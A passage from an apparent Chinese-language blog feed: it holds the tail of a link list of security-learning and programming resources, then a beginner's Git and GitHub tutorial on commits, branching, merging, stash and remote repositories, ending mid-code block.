href="https://paper.seebug.org/%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://paper.seebug.org/：漏洞分析</a></p><p><a href="http://wiki.ioin.in/sort/vulnerability%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">http://wiki.ioin.in/sort/vulnerability：漏洞分析</a></p><p><a href="https://www.bugbank.cn/%EF%BC%9A%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C" target="_blank" rel="noopener">https://www.bugbank.cn/：漏洞银行</a></p><p><a href="https://buuoj.cn/%EF%BC%9Abuuctf%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0" target="_blank" rel="noopener">https://buuoj.cn/：buuctf训练平台</a></p><p><a href="https://github.com/bowu678/php_bugs%EF%BC%9Aphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs：php代码审计</a></p><p><a href="http://sectools.org" target="_blank" rel="noopener">http://sectools.org</a>：Network Security Tools</p><p><a href="https://www.yir6.cn" target="_blank" rel="noopener">https://www.yir6.cn</a>：蚁人博客</p><p><a href="https://www.shentoushi.top/index%EF%BC%9A%E6%B8%97%E9%80%8F%E5%B8%88" target="_blank" rel="noopener">https://www.shentoushi.top/index：渗透师</a></p><p><a href="https://www.ctfhub.com/%EF%BC%9Actfhub" target="_blank" rel="noopener">https://www.ctfhub.com/：ctfhub</a></p><p><a href="https://www.t00ls.net/%EF%BC%9Atools" target="_blank" rel="noopener">https://www.t00ls.net/：tools</a></p><p><a href="https://www.52pojie.cn/%EF%BC%9A%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3" target="_blank" rel="noopener">https://www.52pojie.cn/：吾爱破解</a></p><p><a href="https://www.freebuf.com/%EF%BC%9Afreebuf" target="_blank" rel="noopener">https://www.freebuf.com/：freebuf</a></p><p><a href="https://www.anquanke.com/%EF%BC%9A%E5%AE%89%E5%85%A8%E5%AE%A2" target="_blank" rel="noopener">https://www.anquanke.com/：安全客</a></p><p><a href="https://www.ichunqiu.com/%EF%BC%9Ai%E6%98%A5%E7%A7%8B" target="_blank" rel="noopener">https://www.ichunqiu.com/：i春秋</a></p><p><a href="https://www.leavesongs.com/%EF%BC%9Ap%E7%89%9B%E5%8D%9A%E5%AE%A2" target="_blank" rel="noopener">https://www.leavesongs.com/：p牛博客</a></p><p><a href="https://www.hacking8.com/%EF%BC%9AHacking8" target="_blank" rel="noopener">https://www.hacking8.com/：Hacking8</a></p><p><a href="https://ctf-wiki.github.io/%EF%BC%9ACTF%E7%BB%B4%E5%9F%BA" target="_blank" rel="noopener">https://ctf-wiki.github.io/：CTF维基</a></p><p><a href="https://sec-wiki.com/%EF%BC%9A%E5%AE%89%E5%85%A8%E7%BB%B4%E5%9F%BA" target="_blank" rel="noopener">https://sec-wiki.com/：安全维基</a></p><p><a href="http://bbs.iosre.com/:IOSRE" target="_blank" rel="noopener">http://bbs.iosre.com/:IOSRE</a></p><p><a href="https://www.52pojie.cn/%EF%BC%9A%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%AE%BA%E5%9D%9B" target="_blank" rel="noopener">https://www.52pojie.cn/：吾爱破解论坛</a></p><p><a href="https://www.xazlsec.com/%EF%BC%9A%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF" target="_blank" rel="noopener">https://www.xazlsec.com/：信安之路</a></p><p><a href="https://bbs.pediy.com/%EF%BC%9A%E7%9C%8B%E9%9B%AA%E5%AD%A6%E9%99%A2" target="_blank" rel="noopener">https://bbs.pediy.com/：看雪学院</a></p><p><a href="https://xz.aliyun.com/%EF%BC%9A%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA" target="_blank" rel="noopener">https://xz.aliyun.com/：先知社区</a></p><ul><li>手册与指南</li></ul><p><a href="https://www.wikipedia.org/%EF%BC%9A%E7%BB%B4%E5%9F%BA%E7%99%BE%E7%A7%91" target="_blank" rel="noopener">https://www.wikipedia.org/：维基百科</a></p><p><a href="https://sourceware.org/gdb/onlinedocs/gdb/%EF%BC%9ADebugging" target="_blank" rel="noopener">https://sourceware.org/gdb/onlinedocs/gdb/：Debugging</a> with GDB</p><p><a href="http://ref.x86asm.net/geek64.html%EF%BC%9AX86" target="_blank" rel="noopener">http://ref.x86asm.net/geek64.html：X86</a> Opcode and Instruction Reference</p><ul><li>软件开发与开源平台</li></ul><p><a href="https://github.com/%EF%BC%9A%E5%BC%80%E6%BA%90%E5%B9%B3%E5%8F%B0%E4%B8%8E%E8%BD%AF%E4%BB%B6%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86" target="_blank" rel="noopener">https://github.com/：开源平台与软件项目管理</a></p><ul><li>其他</li></ul><p><a href="http://www.w3school.com.cn" target="_blank" rel="noopener">www.w3school.com.cn</a>：w3school</p><p><a href="http://www.liaoxuefeng.com" target="_blank" rel="noopener">www.liaoxuefeng.com</a>: 廖雪峰的官方网站</p><p><a href="https://www.runoob.com" target="_blank" rel="noopener">https://www.runoob.com</a>：菜鸟教程</p><p><code>个人发展指南</code></p><ul><li>实习</li></ul><p><a href="https://pg.ucsd.edu/PhD-internships.htm%EF%BC%9APh.D" target="_blank" rel="noopener">https://pg.ucsd.edu/PhD-internships.htm：Ph.D</a>. Student Internships(By Philip Guo)</p><ul><li>推荐信</li></ul><p><a href="https://pg.ucsd.edu/asking-for-recommendation-letters.htm%EF%BC%9AAsking" target="_blank" rel="noopener">https://pg.ucsd.edu/asking-for-recommendation-letters.htm：Asking</a> for Recommendation Letters(By Philip Guo)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4&gt;网络资源&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;开放课平台&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ocw.mit.edu/:&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ocw.mit.edu/:&lt;/a&gt; MIT开放课程资
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Git以及Github的使用教程</title>
    <link href="https://muzibing.github.io/2020/07/29/2020.07.29%EF%BC%88143%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/29/2020.07.29（143）/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-08-23T10:14:39.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Git-教程"><a href="#一、Git-教程" class="headerlink" title="一、Git 教程"></a>一、Git 教程</h3><h4 id="1-Git-介绍"><a href="#1-Git-介绍" class="headerlink" title="1.Git 介绍"></a>1.Git 介绍</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Git (/ɡɪt/) is a distributed version-control system for tracking changes in source code during software development.[8] It is designed for coordinating work among programmers, but it can be used to track changes in any set of files. Its goals include speed,[9] data integrity,[10] and support for distributed, non-linear workflows.[11]  Git was created by Linus Torvalds in 2005 for development of the Linux kernel, with other kernel developers contributing to its initial development.[12] Its current maintainer since 2005 is Junio Hamano. As with most other distributed version-control systems, and unlike most client–server systems, every Git directory on every computer is a full-fledged repository with complete history and full version-tracking abilities, independent of network access or a central server.[13] Git is free and open-source software distributed under the terms of the GNU General Public License version 2.—wiki</p><blockquote><p>Git是一个分布式版本控制系统，用于在软件开发过程中跟踪源代码的变化。它是为协调程序员之间的工作而设计的，但可用于跟踪任何文件集中的更改。其目标包括速度数据完整性以及对分布式非线性工作流的支持。</p><p>Git由Linus Torvalds于2005年创建，用于Linux内核的开发，其他内核开发人员也为Git的初始开发做出了贡献。自2005年以来，它的当前维护者是Junio Hamano。与大多数其他分布式版本控制系统一样，与大多数客户端服务器系统不同，每台计算机上的每个Git目录都是具有完整历史记录和完整版本跟踪功能的成熟存储库，而与网络访问或中央服务器无关。 Git是根据GNU通用公共许可版本2的条款分发的免费和开源软件。</p></blockquote><h4 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h4><p><code>Linux</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p><code>Windows</code></p><blockquote><p>在Windows上使用Git，可以从Git官网直接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载安装程序</a>，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！</p></blockquote><p><code>配置Git用户名</code></p><blockquote><p>这要和配置github的信息要区分开来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br></pre></td></tr></table></figure><h4 id="3-创建版本库"><a href="#3-创建版本库" class="headerlink" title="3.创建版本库"></a>3.创建版本库</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先有必要了解一下版本库的工作区和暂存区：</p><p><img src="/images/143-1.png" alt></p><blockquote><p>如上图所示，工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库，上图就是在演示将文件从工作区移到版本库中，分为了两步。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p>一定要在空目录下创建</p></blockquote><p><code>初始化</code></p><blockquote><p>将自己创建的空目录变为Git可以管理的仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><p><code>把文件添加到版本库</code></p><blockquote><p>第一步，用命令<code>git add</code>告诉Git，把文件添加到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>第二步，用命令<code>git commit</code>告诉Git，把文件提交到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br></pre></td></tr></table></figure><p><code>查看仓库当前状态</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h4 id="4-修改文件"><a href="#4-修改文件" class="headerlink" title="4.修改文件"></a>4.修改文件</h4><blockquote><p>查看修改的内容</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br></pre></td></tr></table></figure><h4 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5.版本回退"></a>5.版本回退</h4><p><code>查看历史记录</code></p><blockquote><p>显示从最近到最远的提交日。</p><font size="2">需要友情提示的是，你看到的一大串类似`1094adb...`的是`commit id`（版本号），和SVN不一样，Git的`commit id`不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的`commit id`和我的肯定不一样，以你自己的为准。为什么`commit id`需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，如果还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</font></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><p><code>版本回退</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br></pre></td></tr></table></figure><blockquote><p>上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，当你回退版本的时候，Git仅仅是把HEAD从指向<code>回退前的状态</code>改为指向<code>回退后的状态</code>，然后顺便把工作区的文件更新了。</p></blockquote><p><code>查看每一次命令的信息</code></p><blockquote><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br></pre></td></tr></table></figure><h4 id="6-撤销修改"><a href="#6-撤销修改" class="headerlink" title="6.撤销修改"></a>6.撤销修改</h4><p><code>丢弃工作区的修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>命令<code>git checkout -- readme.txt</code>意思就是，把<code>readme.txt</code>文件在工作区的修改全部撤销，这里有两种情况：</p><ul><li><p>一种是<code>readme.txt</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p></li><li><p>一种是<code>readme.txt</code>已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p></li></ul><p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p><font size="2">`git checkout -- file`命令中的`--`很重要，没有`--`，就变成了“切换到另一个分支”的命令</font></blockquote><h4 id="7-删除文件"><a href="#7-删除文件" class="headerlink" title="7.删除文件"></a>7.删除文件</h4><blockquote><p>在Git中，删除也是一个修改操作，</p></blockquote><p><code>确实要从版本库中删除该文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line">rm 'test.txt'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove test.txt"</span></span></span><br><span class="line">[master d46f35e] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure><h3 id="二、Github使用"><a href="#二、Github使用" class="headerlink" title="二、Github使用"></a>二、Github使用</h3><h4 id="1-创建SSH-Key"><a href="#1-创建SSH-Key" class="headerlink" title="1.创建SSH Key"></a>1.创建SSH Key</h4><blockquote><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对，<code>id_rsa</code>是私钥，不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p></blockquote><h4 id="2-登陆GitHub"><a href="#2-登陆GitHub" class="headerlink" title="2.登陆GitHub"></a>2.登陆GitHub</h4><blockquote><p>打开“Account settings”，“SSH Keys”页面，然后点“Add SSH Key”，填上任意Title，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容：</p></blockquote><p><img src="/images/143-2.png" alt></p><h4 id="3-添加远程库"><a href="#3-添加远程库" class="headerlink" title="3.添加远程库"></a>3.添加远程库</h4><p><code>情景</code></p><blockquote><p>已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p></blockquote><p><code>第一步</code></p><blockquote><p>首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库</p></blockquote><p><code>第二步</code></p><blockquote><p>在Repository name填入<code>learngit</code>，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库</p></blockquote><p><code>第三步</code></p><blockquote><p>将本地git仓库和远程的github仓库关联起来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">" Your Github address"</span></span></span><br></pre></td></tr></table></figure><p><code>第四步</code></p><blockquote><p>把本地仓库的所有内容推送到远程库上</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><blockquote><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们<strong>第一次推送<code>master</code>分支时，加上了<code>-u</code>参数</strong>，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</p></blockquote><h4 id="4-从远程仓库克隆"><a href="#4-从远程仓库克隆" class="headerlink" title="4.从远程仓库克隆"></a>4.从远程仓库克隆</h4><p><code>克隆一个本地库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@<span class="string">"github address"</span></span></span><br></pre></td></tr></table></figure><h4 id="5-创建与合并分支"><a href="#5-创建与合并分支" class="headerlink" title="5.创建与合并分支"></a>5.创建与合并分支</h4><blockquote><p><code>HEAD</code>严格来说不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p></blockquote><p><img src="/images/143-3.png" alt></p><blockquote><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p></blockquote><p><img src="/images/143-4.png" alt></p><blockquote><p>Git创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p><p>不过，从现在开始，对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p></blockquote><p><img src="/images/143-5.png" alt></p><blockquote><p>假如我们在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。Git怎么合并呢？最简单的方法，就是直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并：</p></blockquote><p><img src="/images/143-6.png" alt></p><blockquote><p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p><p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：</p></blockquote><p><img src="/images/143-7.png" alt></p><p><code>创建dev分支，然后切换dev分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b dev</span></span><br></pre></td></tr></table></figure><blockquote><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev</span></span><br></pre></td></tr></table></figure><p><code>查看当前分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><code>把dev分支的工作成果合并到master分支上</code></p><blockquote><p>要先执行<code>git add &quot;fileName&quot;</code>和<code>git commit &quot;fileName&quot;</code>，才能进行合并</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><blockquote><p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。如果<font color="red">合并分支时加上<code>--no-ff</code>参数：表示禁用<code>Fast forward</code></font>的区别：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br></pre></td></tr></table></figure><blockquote><p>下图是加上该参数的情况</p></blockquote><p><img src="/images/143-8.png" alt></p><p><code>查看分支合并的情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br></pre></td></tr></table></figure><h4 id="6-删除分支"><a href="#6-删除分支" class="headerlink" title="6.删除分支"></a>6.删除分支</h4><p><code>删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><p><code>强行删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br></pre></td></tr></table></figure><h4 id="7-解决冲突"><a href="#7-解决冲突" class="headerlink" title="7.解决冲突"></a>7.解决冲突</h4><blockquote><p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch is quick &amp; simple.</span><br><span class="line">=======</span><br><span class="line">Creating a new branch is quick AND simple.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; feature1</span></span><br></pre></td></tr></table></figure><blockquote><p>我们修改如下后保存：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Creating a new branch is quick and simple.</span><br></pre></td></tr></table></figure><h4 id="8-分支策略"><a href="#8-分支策略" class="headerlink" title="8.分支策略"></a>8.分支策略</h4><blockquote><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。所以，团队合作的分支看起来就像这样：</p></blockquote><p><img src="/images/143-9.png" alt></p><h4 id="9-Bug分支"><a href="#9-Bug分支" class="headerlink" title="9.Bug分支"></a>9.Bug分支</h4><p><code>储存当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br></pre></td></tr></table></figure><p><code>从当前分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br></pre></td></tr></table></figure><p><code>创建Bug分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br></pre></td></tr></table></figure><p><code>修复Bug</code></p><p><code>从bug分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br></pre></td></tr></table></figure><p><code>合并分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br></pre></td></tr></table></figure><p><code>切换到干活的分支</code></p><p><code>查看当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br></pre></td></tr></table></figure><p><code>恢复当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复的同时把stash内容也删了</p></blockquote><p><code>在不同的分支上同步修改bug的操作</code></p><blockquote><p>比如我们在master分支上修复了bug，那么我们怎么同步到dev分支上呢？同样的bug，要在dev上修复，我们只需要把<code>4c805e2 fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code>4c805e2 fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br></pre></td></tr></table></figure><h4 id="10-多人协作"><a href="#10-多人协作" class="headerlink" title="10.多人协作"></a>10.多人协作</h4><p><code>查看远程库信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure><blockquote><p>用<code>git remote -v</code>显示更详细的信息</p></blockquote><p><code>推送分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br></pre></td></tr></table></figure><ul><li><code>master</code>分支是主分支，因此要时刻与远程同步；</li><li><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</li><li><code>bug</code>分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</li><li><code>featur</code>e分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</li></ul><p><code>抓取分支</code></p><blockquote><p>首先要克隆一个仓库，如果A在修改文件后push到远程仓库后，你也要push到远程仓库，那么会收到如下信息：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span 